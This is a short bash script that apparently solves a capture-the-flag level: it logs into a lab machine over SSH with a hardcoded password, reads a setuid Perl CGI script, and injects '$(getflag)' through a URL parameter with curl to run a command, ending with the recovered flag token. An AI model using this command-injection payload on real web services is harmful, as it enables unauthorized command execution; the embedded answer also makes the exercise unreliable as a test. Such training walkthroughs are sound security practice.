#!/bin/bash

ssh() {
    sshpass -p 'qi0maab88jeaj46qoumi7maus' ssh level04@localhost -p 2220 "$1"  
}

#flag
ssh "ls -la"
# -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

ssh 'getfacl ./level04.pl'

read pause

ssh "cat ./level04.pl"

read pause

# CGI reader content.
# Acess with curl and pass the params

echo $(whoami)
echo whoami

ssh 'curl "http://localhost:4747/level04.pl?x=\$(getflag)"'

# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap